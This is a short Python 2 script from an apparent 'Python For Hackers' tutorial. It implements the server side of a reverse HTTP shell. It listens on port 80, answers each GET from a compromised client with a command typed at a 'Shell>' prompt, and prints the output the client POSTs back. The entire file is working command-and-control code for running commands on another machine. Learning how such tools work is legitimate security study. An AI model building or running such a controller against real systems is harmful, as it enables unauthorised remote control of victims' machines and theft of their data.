# Python For Hackers : Priyank Gada
#www.youtube.com/priyankgada
#Reverse HTTP Shell Server .

import BaseHTTPServer   # Used to make HTTP server 

HOST_NAME = '10.10.10.10'   # Server IP
PORT_NUMBER = 80   # Port Number to listen from.


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):   # MyHandler defines what we should do when we receive a GET/POST request

    def do_GET(s):
                                         # For GET REQUEST
        command = raw_input("Shell> ")   #Enter commands 
        s.send_response(200)             #Response with OK
        s.send_header("Content-type", "text/html")  # content type is  "text/html"
        s.end_headers()
        s.wfile.write(command)           # Send the command 

            
    def do_POST(s):
                                                     #FOR POST REQUEST 
        s.send_response(200)                         #Response with OK
        s.end_headers()
        length  = int(s.headers['Content-Length'])   #converts value to integer
        postVar = s.rfile.read(length)               # Read and print the posted data
        print postVar
        
        

if __name__ == '__main__':


    # Main part ....
    
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler) #passing IP and port number


    
    try:     
        httpd.serve_forever()   # Loop 
    except KeyboardInterrupt:   
        print '[!] Server is terminated' #ctrl+c will terminate server and will print server is terminated
        httpd.server_close()
       
